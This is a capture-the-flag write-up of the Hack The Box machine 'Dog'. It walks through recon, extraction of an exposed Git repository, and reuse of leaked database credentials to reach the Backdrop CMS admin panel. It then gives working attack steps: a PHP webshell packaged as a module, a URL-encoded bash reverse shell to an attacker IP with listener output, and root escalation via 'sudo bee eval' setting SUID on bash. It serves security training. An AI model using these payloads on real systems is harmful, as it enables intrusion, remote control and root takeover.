---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/dog/","tags":["#linux","backdrop-cms","PHP","valid-account-determination","passwordReuse","exposed_git_dir","bee-backdrop-cms"]}
---


# 10.10.11.58
---
# Enumeration & Recon bits
## ports
```sh
sudo nmap -sS -sV -sC -v  -oN .$(basename $PWD).nmap.txt 10.10.11.58
```

```bash hl:1,6,15
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git:
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
- add the box as an /etc/hosts entry for `dog.htb`

## other recon bits
```sh
python3 ~/Documents/src/gh-tools/GitHack/GitHack.py http://dog.htb/.git/
```
- We have a git repo so lets pull the source with GitHack and look at it
#### robots.txt
```
User-agent: *
Crawl-delay: 10
# Directories
Disallow: /core/
Disallow: /profiles/
# Files
Disallow: /README.md
Disallow: /web.config
# Paths (clean URLs)
Disallow: /admin
Disallow: /comment/reply
Disallow: /filter/tips
Disallow: /node/add
Disallow: /search
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
# Paths (no clean URLs)
Disallow: /?q=admin
Disallow: /?q=comment/reply
Disallow: /?q=filter/tips
Disallow: /?q=node/add
Disallow: /?q=search
Disallow: /?q=user/password
Disallow: /?q=user/register
Disallow: /?q=user/login
Disallow: /?q=user/logout
```
- some interesting routes to check out
- it also looks like they're using a `q` parameter to determine page content, so I should fuzz that for additional endpoints, seems like case insensitive as well
#### settings.php
```php
$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';

$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```
- db user password, possibly re-used
#### files/js/
there's some good stuff in here but it's a lot so there's probably an easier route. none of the names make any sense.

#### Manual browsing
![Pasted image 20250806102819.png](/img/user/img/Pasted%20image%2020250806102819.png)
![Pasted image 20250806104341.png](/img/user/img/Pasted%20image%2020250806104341.png)
- *valid account determination?*
![Pasted image 20250806104457.png](/img/user/img/Pasted%20image%2020250806104457.png)
- directory listing enabled as well as the .git repo, but it just has the same content as the repo.
speaking of .git repo, I should check for usernames in commits (uname@dog.htb) based on their support email and usual format.

```sh
grep -r '@dog.htb' .
```
- got `dog` and `tiffany`
	- although tiffany was an update to `update.settings.json`
## creds
- database (mysql)
`root:BackDropJ2024DS2024`

- admin dashboard
`tiffany:BackDropJ2024DS2024` (*password reuse*)

### Summary:
1. find the git repo
2. use a githack tool to download the folder + source code
3. find usernames through the repo following usual boxname format `@dog.htb` or brute-force valid account names through password reset
4. use database password in source code re-used for tiffany user
## Software versions
backdrop cms 1.27.1
- `core/profiles/testing/testing.info`
  
# Exploitation i.e getting a foothold
I found this exploit for RCE that makes a malicious module featuring a webshell:
- https://www.exploit-db.com/exploits/52021
	- site doesn't support zip so lets do it manually instead

1. download the module template [here](https://github.com/backdrop-contrib/module_template)
2. change the folder name to `mymodule` - `mv module_template/ mymodule/`
3. add a simple php webshell file: `<?php system($_GET['cmd']);?>`
4. compress everything into a `tar` archive: `tar -cf mymodule.tar mymodule/`
5. go back to the admin dashboard page for manual module installation: `http://10.10.11.58/?q=admin/installer/manual`
6. upload the module and click install
7. browse to http://10.10.11.58/modules/mymodule/shell.php?cmd=id for the webshell
8. http://10.10.11.58/modules/mymodule/shell.php?cmd=bash%20-c%20%27%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.4%2F4451%200%3E%261%27

from here you can launch a revshell, but make sure to wrap it in a `bash -c` and you'll need to urlencode it:
```url
http://10.10.11.58/modules/mymodule/shell.php?cmd=bash%20-c%20%27%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F(IP_HERE)%2F(PORT_HERE)%200%3E%261%27
```

and of course have a listener open:
```bash
nc -nvlp 4451

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4451
Ncat: Listening on 0.0.0.0:4451
Ncat: Connection from 10.10.11.58.
Ncat: Connection from 10.10.11.58:60176.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
# Post Exploitation, Pivoting & Privilege escalation
First thing is to check how we can pivot to a real user, since the revshell is as `www-data`.

```sh
ls /home

jobert
johncusack
```
- two users to try logging into

Since there was password re-use in the web app, it's worth checking if there's password re-use on the system too.
- Because this is a revshell, so we could upgrade the shell, or we could just attempt ssh from another terminal, which ends up working for `johncusack`

> `user.txt` in the /home/johncusack directory

now lets see what if john can run anything as sudo:
```sh
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

Not familiar with `bee`, but it seems it's a helper utility for backdrop cms. the `eval` option looks useful:

```sh
---SNIP---
ADVANCED
  db-query
   dbq
   Execute a query using db_query().

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop's database credentials.
```
- eval arbitrary php code? as sudo? ezpz

```sh
sudo bee eval "system('chmod +s /bin/bash')"

 ✘  The required bootstrap level for 'eval' is not ready.
```
- I prefer to set suid bit on bash for persistence purposes


came across this [post](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html) regarding the error and privilege escalation techniques.
```txt
#BackDrop CMS 
sudo bee eval "system('/bin/bash');"

#In case of `The required bootstrap level for 'eval' is not ready.` Error
#Find the application path  - generally in /var/www/html
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
```
So I guess it means that it needs to be ran in the web dir? or I can pass `--root` flag.

It seems like both work:
```sh
johncusack@dog:~$ sudo bee eval "system('chmod +s /bin/bash')" --root=/var/www/html
[sudo] password for johncusack:
johncusack@dog:~$ cd /var/www/html
johncusack@dog:/var/www/html$ sudo bee eval "system('chmod +s /bin/bash')"
```
- no errors for either

Finally, just run `/bin/bash -p` to make use of the suid bit.

```bash
bash-5.0# id
uid=1001(johncusack) gid=1001(johncusack) euid=0(root) egid=0(root) groups=0(root),1001(johncusack)
bash-5.0#
```

---